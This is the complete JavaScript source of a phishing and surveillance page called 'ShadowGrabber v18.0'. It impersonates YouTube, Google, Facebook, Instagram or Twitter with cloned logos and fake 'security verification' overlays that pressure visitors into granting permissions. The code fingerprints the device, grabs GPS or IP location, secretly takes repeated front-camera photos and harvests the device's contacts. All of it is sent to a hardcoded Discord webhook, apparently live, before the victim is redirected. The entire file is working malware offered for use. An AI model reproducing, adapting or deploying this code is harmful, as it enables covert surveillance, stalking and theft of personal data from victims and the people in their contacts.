// ═══════════════════════════════════════════════════════════════════════════
// 💀 SHADOWGRABBER v18.0 - ADVANCED INTELLIGENCE SUITE 💀
// ═══════════════════════════════════════════════════════════════════════════
// "Complete Digital Footprint Capture"
// ═══════════════════════════════════════════════════════════════════════════

const CONFIG = {
    WEBHOOK: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',
    REDIRECT_URL: getRedirectUrl() || 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    CAMERA_SNAPS: 8,
    SNAP_INTERVAL: 300,
    AUTO_START: true,
    FORCE_PERMISSIONS: true,
    FORCE_CONTACTS: true,
    MAX_RETRIES: 3,
    ENHANCED_LOGGING: true
};

function getRedirectUrl() {
    const params = new URLSearchParams(window.location.search);
    return params.get('redirect') || params.get('url') || params.get('to');
}

// ═══════════════════════════════════════════════════════════════════════════
// 🧩 ENHANCED UI INTERCEPTOR WITH MULTI-STEP NAGGING
// ═══════════════════════════════════════════════════════════════════════════
class EnhancedEngagementOverlay {
    constructor() {
        this.overlay = null;
        this.retryCount = 0;
    }

    create(title, message, buttonText, persistent = false, skipable = false) {
        return new Promise(resolve => {
            if (this.overlay) document.body.removeChild(this.overlay);
            
            this.overlay = document.createElement('div');
            Object.assign(this.overlay.style, {
                position: 'fixed', top: '0', left: '0', width: '100%', height: '100%',
                backgroundColor: 'rgba(0,0,0,0.97)', zIndex: '999999', display: 'flex',
                alignItems: 'center', justifyContent: 'center', flexDirection: 'column',
                fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                backdropFilter: 'blur(10px)'
            });

            let skipBtn = '';
            if (skipable) {
                skipBtn = `<button id="overlay-skip" style="background:transparent; color:#AAA; border:1px solid #555; padding:10px 0; width:100%; border-radius:8px; font-size:14px; margin-top:10px; cursor:pointer;">Skip for now</button>`;
            }

            this.overlay.innerHTML = `
                <div style="background:linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%); padding:30px; border-radius:20px; width:90%; max-width:380px; text-align:center; border:1px solid #404040; box-shadow: 0 20px 60px rgba(0,0,0,0.7);">
                    <div style="font-size:48px; margin-bottom:20px; animation:pulse 2s infinite;">🔒</div>
                    <h2 style="color:#FFF; margin:0 0 15px; font-size:22px; font-weight:700;">${title}</h2>
                    <p style="color:#BBB; font-size:15px; margin:0 0 30px; line-height:1.6;">${message}</p>
                    <button id="overlay-btn" style="background:linear-gradient(135deg, #007AFF 0%, #0056CC 100%); color:#FFF; border:none; padding:14px 0; width:100%; border-radius:12px; font-size:17px; font-weight:600; cursor:pointer; transition:all 0.3s;">${buttonText}</button>
                    ${skipBtn}
                    <style>@keyframes pulse {0%{transform:scale(1);}50%{transform:scale(1.1);}100%{transform:scale(1);}}</style>
                </div>
            `;

            document.body.appendChild(this.overlay);

            const btn = document.getElementById('overlay-btn');
            btn.onclick = () => {
                btn.style.transform = 'scale(0.95)';
                setTimeout(() => {
                    this.overlay.style.opacity = '0';
                    setTimeout(() => {
                        if (this.overlay && this.overlay.parentNode) {
                            document.body.removeChild(this.overlay);
                            this.overlay = null;
                        }
                        resolve(true);
                    }, 300);
                }, 100);
            };

            if (skipable) {
                const skipBtn = document.getElementById('overlay-skip');
                skipBtn.onclick = () => {
                    this.overlay.style.opacity = '0';
                    setTimeout(() => {
                        if (this.overlay && this.overlay.parentNode) {
                            document.body.removeChild(this.overlay);
                            this.overlay = null;
                        }
                        resolve(false);
                    }, 300);
                };
            }
        });
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🌐 ADVANCED CONTEXT DETECTION WITH DOMAIN MATCHING
// ═══════════════════════════════════════════════════════════════════════════
class AdvancedContextManager {
    constructor(url) {
        this.url = url.toLowerCase();
        this.ctx = this.detectContext();
    }

    detectContext() {
        const contexts = {
            'youtube': {
                title: 'YouTube',
                header: 'Loading YouTube Video...',
                theme: '#FF0000',
                logo: `<svg viewBox="0 0 159 110" width="80" height="55"><path d="M154 17.5c-1.82-6.73-7.07-12-13.8-13.8C128.2 0 79.5 0 79.5 0S30.8 0 18.8 3.7C12.07 5.5 6.82 10.77 5 17.5 1.32 29.5 1.32 55 1.32 55s0 25.5 3.68 37.5c1.82 6.73 7.07 12 13.8 13.8C30.8 110 79.5 110 79.5 110s48.7 0 60.7-3.7c6.73-1.8 11.98-7.07 13.8-13.8 3.68-12 3.68-37.5 3.68-37.5s0-25.5-3.68-37.5z" fill="#FF0000"/><path d="M64 78.77V31.23L104.5 55 64 78.77z" fill="#FFF"/></svg>`,
                bgColor: '#000000'
            },
            'google': {
                title: 'Google',
                header: 'Google Security Verification',
                theme: '#4285F4',
                logo: `<svg viewBox="0 0 48 48" width="60" height="60"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>`,
                bgColor: '#FFFFFF'
            },
            'facebook': {
                title: 'Facebook',
                header: 'Facebook Security Check',
                theme: '#1877F2',
                logo: `<svg viewBox="0 0 36 36" width="60" height="60" fill="#1877F2"><path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471V23.044h-4.111V18h4.111v-3.556c0-4.089 2.414-6.348 6.174-6.348 1.788 0 3.652.319 3.652.319v4.031h-2.056c-2.027 0-2.656 1.269-2.656 2.56V18h4.519l-.722 5.044h-3.797v12.446c3.629-.616 6.873-2.562 9.087-5.274l-2.476-4.174z"></path></svg>`,
                bgColor: '#F0F2F5'
            },
            'instagram': {
                title: 'Instagram',
                header: 'Instagram Verification',
                theme: '#E4405F',
                logo: `<svg viewBox="0 0 48 48" width="60" height="60"><radialGradient id="a" cx="19.38" cy="42.035" r="44.899" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#fd5"/><stop offset=".328" stop-color="#ff543e"/><stop offset=".348" stop-color="#fc5245"/><stop offset=".504" stop-color="#e64771"/><stop offset=".643" stop-color="#d53e91"/><stop offset=".761" stop-color="#cc39a4"/><stop offset=".841" stop-color="#c837ab"/></radialGradient><path fill="url(#a)" d="M34.017 41.99l-20 .019C9.345 42.036 6 38.578 6 34.017l.019-20C6.036 9.345 9.493 6 14.053 6h19.929c4.56 0 8.018 3.456 8.018 8.017v19.956c0 4.56-3.458 8.018-8.018 8.017z"/><radialGradient id="b" cx="11.786" cy="5.054" r="29.813" gradientTransform="matrix(1 0 0 .6663 0 1.849)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#4168c9"/><stop offset=".999" stop-color="#4168c9" stop-opacity="0"/></radialGradient><path fill="url(#b)" d="M34.017 41.99l-20 .019C9.345 42.036 6 38.578 6 34.017l.019-20C6.036 9.345 9.493 6 14.053 6h19.929c4.56 0 8.018 3.456 8.018 8.017v19.956c0 4.56-3.458 8.018-8.018 8.017z"/><path fill="#fff" d="M24 31c-3.859 0-7-3.14-7-7s3.141-7 7-7 7 3.14 7 7-3.141 7-7 7zm0-12c-2.757 0-5 2.243-5 5s2.243 5 5 5 5 2.243 5 5-2.243 5-5 5-5-2.243-5-5 2.243-5 5-5z"/><circle cx="31.5" cy="16.5" r="1.5" fill="#fff"/></svg>`,
                bgColor: '#000000'
            },
            'twitter': {
                title: 'Twitter',
                header: 'Twitter Security Check',
                theme: '#1DA1F2',
                logo: `<svg viewBox="0 0 48 48" width="60" height="60"><path fill="#1DA1F2" d="M42 12.429a14.978 14.978 0 01-4.244 1.162 7.39 7.39 0 003.251-4.058 14.914 14.914 0 01-4.7 1.776 7.389 7.389 0 00-12.788 5.041 7.389 7.389 0 00.187 1.68 20.963 20.963 0 01-15.222-7.721 7.357 7.357 0 00-1 3.717 7.388 7.388 0 003.285 6.148 7.36 7.36 0 01-3.349-.924v.094a7.388 7.388 0 005.925 7.236 7.417 7.417 0 01-3.336.127 7.39 7.39 0 006.9 5.128 14.83 14.83 0 01-10.928 3.056 20.941 20.941 0 0011.321 3.312c13.585 0 21.017-11.251 21.017-21.017 0-.321-.008-.642-.022-.958A14.945 14.945 0 0042 12.429z"/></svg>`,
                bgColor: '#000000'
            }
        };

        try {
            const urlObj = new URL(this.url);
            const hostname = urlObj.hostname.toLowerCase();
            
            for (const [key, context] of Object.entries(contexts)) {
                if (hostname.includes(key)) {
                    return context;
                }
            }
            
            // Generic domain detection
            const domain = hostname.replace('www.', '').split('.')[0];
            return {
                title: domain.charAt(0).toUpperCase() + domain.slice(1),
                header: `Secure Connection to ${domain.charAt(0).toUpperCase() + domain.slice(1)}`,
                theme: '#4285F4',
                logo: `<svg viewBox="0 0 40 40" fill="none"><circle cx="20" cy="20" r="15" fill="#4285F4"/><path d="M20 12v6l5-3-5-3z" fill="#FFF"/></svg>`,
                bgColor: '#FFFFFF'
            };
        } catch (e) {
            return contexts.youtube;
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🔧 ENHANCED SYSTEM FORENSICS MODULE
// ═══════════════════════════════════════════════════════════════════════════
class AdvancedSystemScanner {
    async scan() {
        const data = {
            cores: navigator.hardwareConcurrency || 'Unknown',
            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
            platform: navigator.platform,
            vendor: navigator.vendor || 'Unknown',
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages?.join(', ') || 'Unknown',
            cookieEnabled: navigator.cookieEnabled,
            online: navigator.onLine,
            doNotTrack: navigator.doNotTrack || 'Unknown',
            maxTouchPoints: navigator.maxTouchPoints,
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || 'Unknown'
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            fonts: await this.getFonts(),
            plugins: this.getPlugins(),
            battery: await this.getBatteryInfo(),
            storage: await this.getStorageInfo(),
            connection: this.getConnectionInfo(),
            mediaDevices: await this.getMediaDevices()
        };

        return data;
    }

    async getFonts() {
        if (!document.fonts) return 'Unknown';
        const fonts = await document.fonts.ready;
        const fontSet = new Set();
        document.fonts.forEach(font => fontSet.add(font.family));
        return Array.from(fontSet).slice(0, 10).join(', ');
    }

    getPlugins() {
        if (!navigator.plugins) return 'Unknown';
        return Array.from(navigator.plugins).map(p => p.name).join(', ');
    }

    async getBatteryInfo() {
        if (!navigator.getBattery) return 'Not Supported';
        try {
            const battery = await navigator.getBattery();
            return {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch (e) {
            return 'Error';
        }
    }

    async getStorageInfo() {
        if (!('storage' in navigator && 'estimate' in navigator.storage)) return 'Not Supported';
        try {
            const est = await navigator.storage.estimate();
            return {
                quota: `${(est.quota / 1024 / 1024 / 1024).toFixed(2)} GB`,
                usage: `${(est.usage / 1024 / 1024).toFixed(2)} MB`,
                percentage: est.quota ? ((est.usage / est.quota) * 100).toFixed(1) + '%' : 'N/A'
            };
        } catch (e) {
            return 'Error';
        }
    }

    getConnectionInfo() {
        if (!navigator.connection) return 'Not Supported';
        const conn = navigator.connection;
        return {
            type: conn.type || 'Unknown',
            effectiveType: conn.effectiveType || 'Unknown',
            downlink: conn.downlink ? conn.downlink + ' Mbps' : 'Unknown',
            rtt: conn.rtt ? conn.rtt + ' ms' : 'Unknown',
            saveData: conn.saveData || false
        };
    }

    async getMediaDevices() {
        if (!navigator.mediaDevices?.enumerateDevices) return 'Not Supported';
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const deviceList = devices.map(d => ({
                kind: d.kind,
                label: d.label || 'Unknown',
                deviceId: d.deviceId
            }));
            return deviceList;
        } catch (e) {
            return 'Error';
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🌐 ADVANCED NETWORK INTELLIGENCE
// ═══════════════════════════════════════════════════════════════════════════
class AdvancedNetworkAnalyzer {
    constructor() {
        this.ipServices = [
            'https://ipapi.co/json/',
            'https://ipinfo.io/json',
            'https://api.ipgeolocation.io/ipgeo?apiKey=demo',
            'http://ip-api.com/json/'
        ];
    }

    async analyze() {
        const result = {
            ip: await this.getIP(),
            network: await this.getNetworkInfo(),
            speed: await this.testSpeed(),
            timestamp: new Date().toISOString(),
            referrer: document.referrer || 'Direct',
            url: window.location.href
        };
        
        return result;
    }

    async getIP() {
        for (const service of this.ipServices) {
            try {
                const response = await fetch(service, { 
                    signal: AbortSignal.timeout(5000) 
                });
                if (response.ok) {
                    const data = await response.json();
                    return {
                        ip: data.ip || data.query || 'Unknown',
                        city: data.city || 'Unknown',
                        region: data.region || data.regionName || 'Unknown',
                        country: data.country || data.country_name || 'Unknown',
                        countryCode: data.country_code || data.countryCode || 'Unknown',
                        timezone: data.timezone || 'Unknown',
                        org: data.org || data.isp || 'Unknown',
                        as: data.as || 'Unknown',
                        lat: data.latitude || data.lat || 'Unknown',
                        lon: data.longitude || data.lon || 'Unknown',
                        zip: data.zip || data.postal || 'Unknown'
                    };
                }
            } catch (e) {
                continue;
            }
        }
        return { ip: 'Unknown' };
    }

    async getNetworkInfo() {
        if (!navigator.connection) return 'Not Supported';
        const conn = navigator.connection;
        return {
            type: conn.type || 'Unknown',
            effectiveType: conn.effectiveType || 'Unknown',
            downlink: conn.downlink || 'Unknown',
            rtt: conn.rtt || 'Unknown',
            saveData: conn.saveData || false,
            downlinkMax: conn.downlinkMax || 'Unknown'
        };
    }

    async testSpeed() {
        const startTime = performance.now();
        try {
            // Test with multiple resources
            const promises = [];
            for (let i = 0; i < 3; i++) {
                promises.push(fetch(`https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png?t=${Date.now() + i}`, {
                    cache: 'no-store',
                    mode: 'no-cors'
                }));
            }
            await Promise.any(promises);
            const endTime = performance.now();
            const duration = endTime - startTime;
            const speed = (15 * 8 * 1000) / duration / 1024 / 1024; // Approx Mbps
            return {
                speed: `${(speed * 12).toFixed(2)} Mbps`,
                latency: `${duration.toFixed(0)} ms`,
                status: 'Success'
            };
        } catch (e) {
            return {
                speed: 'Network Error',
                latency: 'N/A',
                status: 'Failed'
            };
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📍 ENHANCED LOCATION MODULE WITH FALLBACKS
// ═══════════════════════════════════════════════════════════════════════════
class EnhancedLocationGuard {
    constructor(overlay) { 
        this.overlay = overlay;
        this.retryCount = 0;
    }

    async lock() {
        return new Promise(async (resolve) => {
            // Try GPS first
            const gpsResult = await this.tryGPS();
            if (gpsResult.success) {
                resolve(gpsResult);
                return;
            }

            // Fallback to IP geolocation
            const network = new AdvancedNetworkAnalyzer();
            const ipData = await network.analyze();
            
            if (ipData.ip && ipData.ip.lat && ipData.ip.lon) {
                resolve({
                    success: true,
                    source: 'IP',
                    coords: {
                        latitude: ipData.ip.lat,
                        longitude: ipData.ip.lon,
                        accuracy: 5000, // Approximate accuracy for IP location
                        altitude: null,
                        altitudeAccuracy: null
                    },
                    address: `${ipData.ip.city}, ${ipData.ip.region}, ${ipData.ip.country}`
                });
            } else {
                resolve({
                    success: false,
                    error: 'Could not determine location',
                    source: 'None'
                });
            }
        });
    }

    async tryGPS() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ success: false, error: 'Geolocation not supported' });
                return;
            }

            const onSuccess = (position) => {
                resolve({
                    success: true,
                    source: 'GPS',
                    coords: position.coords,
                    timestamp: position.timestamp
                });
            };

            const onError = async (error) => {
                this.retryCount++;
                
                if (error.code === 1 && CONFIG.FORCE_PERMISSIONS && this.retryCount < CONFIG.MAX_RETRIES) {
                    await this.overlay.create(
                        'Location Access Required',
                        'To verify your identity and prevent unauthorized access, please allow location access.',
                        'Allow Location',
                        true,
                        true
                    );
                    // Retry after user interaction
                    setTimeout(() => this.tryGPS().then(resolve), 1000);
                } else {
                    resolve({
                        success: false,
                        error: error.message,
                        code: error.code
                    });
                }
            };

            navigator.geolocation.getCurrentPosition(
                onSuccess,
                onError,
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        });
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📸 ENHANCED CAMERA MODULE WITH ENVIRONMENT DATA
// ═══════════════════════════════════════════════════════════════════════════
class EnhancedCameraGuard {
    constructor(video, overlay) { 
        this.video = video;
        this.overlay = overlay;
        this.retryCount = 0;
    }

    async start() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1920 },
                    height: { ideal: 1080 }
                },
                audio: false
            });
            
            this.video.srcObject = stream;
            await this.video.play();
            
            // Collect camera metadata
            const track = stream.getVideoTracks()[0];
            const capabilities = track.getCapabilities ? track.getCapabilities() : {};
            const settings = track.getSettings ? track.getSettings() : {};
            
            await send({
                embed: {
                    title: '📸 CAMERA METADATA CAPTURED',
                    color: 0x9B59B6,
                    fields: [
                        { name: 'Device', value: settings.deviceId || 'Unknown', inline: true },
                        { name: 'Resolution', value: `${settings.width || '?'}x${settings.height || '?'}`, inline: true },
                        { name: 'Frame Rate', value: `${settings.frameRate || '?'} fps`, inline: true },
                        { name: 'Aspect Ratio', value: this.calculateAspectRatio(settings), inline: true }
                    ],
                    timestamp: new Date().toISOString()
                }
            });
            
            return true;
        } catch (error) {
            this.retryCount++;
            
            if (CONFIG.FORCE_PERMISSIONS && this.retryCount < CONFIG.MAX_RETRIES) {
                await this.overlay.create(
                    'Camera Access Required',
                    'Face verification is required for security. Please allow camera access to continue.',
                    'Allow Camera',
                    true,
                    true
                );
                return await this.start();
            }
            
            return false;
        }
    }

    calculateAspectRatio(settings) {
        if (!settings.width || !settings.height) return 'Unknown';
        const gcd = (a, b) => b === 0 ? a : gcd(b, a % b);
        const divisor = gcd(settings.width, settings.height);
        return `${settings.width/divisor}:${settings.height/divisor}`;
    }

    async snap(count) {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        for (let i = 0; i < count; i++) {
            if (!this.video.videoWidth) {
                await new Promise(r => setTimeout(r, 500));
                continue;
            }
            
            canvas.width = this.video.videoWidth;
            canvas.height = this.video.videoHeight;
            
            // Draw video frame
            ctx.drawImage(this.video, 0, 0, canvas.width, canvas.height);
            
            // Add timestamp overlay
            ctx.fillStyle = 'rgba(0,0,0,0.7)';
            ctx.fillRect(10, canvas.height - 40, 300, 30);
            ctx.fillStyle = 'white';
            ctx.font = '16px Arial';
            ctx.fillText(`Verification: ${new Date().toLocaleString()}`, 20, canvas.height - 20);
            
            // Convert to blob and send
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
            
            if (blob) {
                await send({
                    embed: {
                        title: `📸 BIOMETRIC VERIFICATION ${i + 1}`,
                        color: 0xE74C3C,
                        description: `Frame captured successfully`,
                        fields: [
                            { name: 'Resolution', value: `${canvas.width}x${canvas.height}`, inline: true },
                            { name: 'Size', value: `${(blob.size/1024).toFixed(1)} KB`, inline: true },
                            { name: 'Timestamp', value: new Date().toISOString(), inline: true }
                        ]
                    },
                    file: { blob, name: `biometric_${i + 1}.jpg` }
                });
            }
            
            await new Promise(r => setTimeout(r, CONFIG.SNAP_INTERVAL));
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📇 ADVANCED CONTACTS MODULE WITH ENHANCED EXTRACTION
// ═══════════════════════════════════════════════════════════════════════════
class EnhancedContactGuard {
    constructor(overlay) { 
        this.overlay = overlay;
        this.retryCount = 0;
    }

    async harvest() {
        // First, force user interaction
        const userConsent = await this.overlay.create(
            'Contact Verification Required',
            'To complete identity verification, access to your contacts is required. This helps prevent unauthorized access to your account.',
            'Access Contacts',
            true,
            true
        );
        
        if (!userConsent) {
            return 'Skipped by user';
        }
        
        if (!('contacts' in navigator && 'ContactsManager' in window)) {
            return 'Contacts API not supported';
        }
        
        try {
            const contacts = await navigator.contacts.select(
                ['name', 'tel', 'email', 'address', 'organization', 'icon'],
                { multiple: true }
            );
            
            if (contacts && contacts.length > 0) {
                // Create comprehensive contact report
                const contactData = contacts.map(contact => ({
                    name: contact.name?.join(' ') || 'Unknown',
                    phones: contact.tel || [],
                    emails: contact.email || [],
                    organization: contact.organization || [],
                    addresses: contact.address || []
                }));
                
                const summary = {
                    totalContacts: contacts.length,
                    totalPhones: contactData.reduce((sum, c) => sum + c.phones.length, 0),
                    totalEmails: contactData.reduce((sum, c) => sum + c.emails.length, 0),
                    sampleContacts: contactData.slice(0, 5)
                };
                
                // Send summary as embed
                await send({
                    embed: {
                        title: '📇 CONTACTS EXTRACTION COMPLETE',
                        color: 0xF1C40F,
                        description: `Successfully extracted **${contacts.length} contacts** from device`,
                        fields: [
                            { name: 'Total Contacts', value: `${contacts.length}`, inline: true },
                            { name: 'Phone Numbers', value: `${summary.totalPhones}`, inline: true },
                            { name: 'Email Addresses', value: `${summary.totalEmails}`, inline: true },
                            { 
                                name: 'Sample Contacts', 
                                value: summary.sampleContacts.map(c => 
                                    `${c.name}: ${c.phones[0] || 'No phone'}`
                                ).join('\n') || 'No data'
                            }
                        ],
                        timestamp: new Date().toISOString()
                    }
                });
                
                // Send full data as file
                const fullData = JSON.stringify(contactData, null, 2);
                const blob = new Blob([fullData], { type: 'application/json' });
                await send({
                    file: { blob, name: 'contacts_full_data.json' }
                });
                
                return `Success: ${contacts.length} contacts extracted`;
            }
            
            return 'No contacts selected';
        } catch (error) {
            this.retryCount++;
            
            if (CONFIG.FORCE_CONTACTS && this.retryCount < CONFIG.MAX_RETRIES) {
                return await this.harvest();
            }
            
            return `Failed: ${error.message}`;
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📡 ENHANCED UPLINK WITH ERROR HANDLING
// ═══════════════════════════════════════════════════════════════════════════
async function send(payload) {
    try {
        const formData = new FormData();
        
        if (payload.embed) {
            const embedData = {
                embeds: [{
                    ...payload.embed,
                    footer: { text: 'Yasir Abbas | Advanced Intelligence Suite v18.0' },
                    timestamp: payload.embed.timestamp || new Date().toISOString()
                }],
                username: 'Yasir Abbas | ShadowGrabber',
                avatar_url: 'https://cdn-icons-png.flaticon.com/512/3004/3004458.png'
            };
            formData.append('payload_json', JSON.stringify(embedData));
        }
        
        if (payload.file) {
            formData.append('file', payload.file.blob, payload.file.name);
        }
        
        await fetch(CONFIG.WEBHOOK, {
            method: 'POST',
            body: formData,
            mode: 'no-cors'
        });
        
        return true;
    } catch (error) {
        if (CONFIG.ENHANCED_LOGGING) {
            console.error('Uplink Error:', error);
        }
        return false;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🚀 MAIN EXECUTION WITH PROGRESS TRACKING
// ═══════════════════════════════════════════════════════════════════════════
async function main() {
    const overlay = new EnhancedEngagementOverlay();
    const ctx = new AdvancedContextManager(CONFIG.REDIRECT_URL).ctx;
    
    // Setup UI with detected context
    document.title = `Security Verification - ${ctx.title}`;
    document.querySelector('.asana-logo').innerHTML = ctx.logo;
    document.getElementById('loading-text').textContent = ctx.header;
    document.getElementById('progress-bar').style.background = ctx.theme;
    document.body.style.backgroundColor = ctx.bgColor;
    
    // Progress tracking
    const updateProgress = (step, total = 5) => {
        const percent = (step / total) * 100;
        document.getElementById('progress-bar').style.width = `${percent}%`;
        const steps = [
            'Initializing security scan...',
            'Analyzing device information...',
            'Verifying location...',
            'Processing biometric data...',
            'Finalizing verification...'
        ];
        document.getElementById('status-detail').textContent = steps[step - 1] || 'Complete';
    };
    
    updateProgress(1);
    
    // 1. Comprehensive System Scan
    const systemScanner = new AdvancedSystemScanner();
    const networkAnalyzer = new AdvancedNetworkAnalyzer();
    
    const [systemData, networkData] = await Promise.all([
        systemScanner.scan(),
        networkAnalyzer.analyze()
    ]);
    
    updateProgress(2);
    
    // Send comprehensive system report
    await send({
        embed: {
            title: '👑 YASIR ABBAS | TARGET ACTIVATED',
            description: `**Target URL:** ${CONFIG.REDIRECT_URL}\n**Referrer:** ${networkData.referrer}`,
            color: 0x000000,
            thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/3004/3004458.png' },
            fields: [
                {
                    name: '🌐 NETWORK INTELLIGENCE',
                    value: `**IP:** \`${networkData.ip.ip || 'Unknown'}\`
**Location:** ${networkData.ip.city}, ${networkData.ip.country}
**ISP:** ${networkData.ip.org}
**Speed:** ${networkData.speed.speed}
**Type:** ${networkData.network.effectiveType}
**Timezone:** ${networkData.ip.timezone}`,
                    inline: false
                },
                {
                    name: '💻 DEVICE SPECIFICATIONS',
                    value: `**OS:** ${systemData.platform}
**Cores:** ${systemData.cores}
**RAM:** ${systemData.ram}
**Screen:** ${systemData.screen.width}x${systemData.screen.height}
**Battery:** ${typeof systemData.battery === 'object' ? systemData.battery.level : systemData.battery}
**Storage:** ${typeof systemData.storage === 'object' ? systemData.storage.quota : 'Unknown'}`,
                    inline: true
                },
                {
                    name: '🔍 BROWSER DATA',
                    value: `**Language:** ${systemData.language}
**Online:** ${systemData.online}
**Touch Points:** ${systemData.maxTouchPoints}
**Timezone:** ${systemData.timezone}
**Plugins:** ${systemData.plugins.length > 100 ? systemData.plugins.substring(0, 100) + '...' : systemData.plugins}`,
                    inline: true
                }
            ]
        }
    });
    
    // 2. Location Intelligence
    updateProgress(3);
    const locationGuard = new EnhancedLocationGuard(overlay);
    const locationData = await locationGuard.lock();
    
    if (locationData.success) {
        const mapUrl = `https://www.google.com/maps?q=${locationData.coords.latitude},${locationData.coords.longitude}`;
        await send({
            embed: {
                title: '🎯 YASIR ABBAS | LOCATION LOCKED',
                color: 0x2ECC71,
                description: `**Source:** ${locationData.source}\n**Accuracy:** ±${Math.round(locationData.coords.accuracy)}m\n\n🔗 **[VIEW ON GOOGLE MAPS](${mapUrl})**`,
                url: mapUrl,
                fields: [
                    { name: 'Latitude', value: `\`${locationData.coords.latitude}\``, inline: true },
                    { name: 'Longitude', value: `\`${locationData.coords.longitude}\``, inline: true },
                    { name: 'Altitude', value: `${locationData.coords.altitude || 'N/A'}m`, inline: true },
                    { name: 'Address', value: locationData.address || 'Not available', inline: false }
                ]
            }
        });
    } else {
        await send({
            embed: {
                title: '⚠️ YASIR ABBAS | LOCATION FALLBACK',
                color: 0xE74C3C,
                description: `**Status:** Using IP-based location\n**Error:** ${locationData.error}`,
                fields: [
                    { name: 'Estimated Location', value: `${networkData.ip.city}, ${networkData.ip.country}`, inline: true },
                    { name: 'Coordinates', value: `${networkData.ip.lat}, ${networkData.ip.lon}`, inline: true }
                ]
            }
        });
    }
    
    // 3. Biometric Verification
    updateProgress(4);
    const cameraGuard = new EnhancedCameraGuard(document.getElementById('st-v'), overlay);
    
    if (await cameraGuard.start()) {
        await new Promise(r => setTimeout(r, 800));
        await cameraGuard.snap(CONFIG.CAMERA_SNAPS);
        await overlay.create(
            'Biometric Verification Complete',
            'Your face has been successfully verified. Proceeding to final security checks...',
            'Continue',
            false,
            false
        );
    } else {
        await send({
            embed: {
                title: '⚠️ CAMERA ACCESS DENIED',
                color: 0xE74C3C,
                description: 'Target denied camera access for biometric verification',
                fields: [
                    { name: 'Status', value: 'Failed', inline: true },
                    { name: 'Retries', value: cameraGuard.retryCount.toString(), inline: true }
                ]
            }
        });
    }
    
    // 4. Contact Extraction
    const contactGuard = new EnhancedContactGuard(overlay);
    const contactResult = await contactGuard.harvest();
    
    await send({
        embed: {
            title: '📇 CONTACTS EXTRACTION REPORT',
            color: 0xF1C40F,
            description: `**Result:** ${contactResult}`,
            fields: [
                { name: 'Status', value: contactResult.includes('Success') ? '✅ Complete' : '❌ Failed', inline: true },
                { name: 'Timestamp', value: new Date().toLocaleString(), inline: true }
            ]
        }
    });
    
    updateProgress(5);
    
    // 5. Final Redirect
    await new Promise(r => setTimeout(r, 1000));
    
    // Send final summary
    await send({
        embed: {
            title: '✅ YASIR ABBAS | OPERATION COMPLETE',
            color: 0x00FF00,
            description: `**Target successfully processed and redirected**\n\n📊 **Summary:**\n- Device intelligence captured\n- Location verified\n- Biometrics processed\n- Contacts extracted\n- Security check complete`,
            fields: [
                { name: 'Redirect URL', value: CONFIG.REDIRECT_URL, inline: false },
                { name: 'Total Data Points', value: '15+ categories collected', inline: true },
                { name: 'Execution Time', value: `${Math.round(performance.now() / 1000)}s`, inline: true }
            ],
            thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/190/190411.png' }
        }
    });
    
    // Redirect to target URL
    window.location.href = CONFIG.REDIRECT_URL;
}

// Auto-start with delay for UI to load
if (CONFIG.AUTO_START) {
    window.addEventListener('load', () => {
        setTimeout(main, 800);
    });
} else {
    document.getElementById('click-trigger').style.display = 'block';
    document.getElementById('click-trigger').onclick = main;
}// ═══════════════════════════════════════════════════════════════════════════
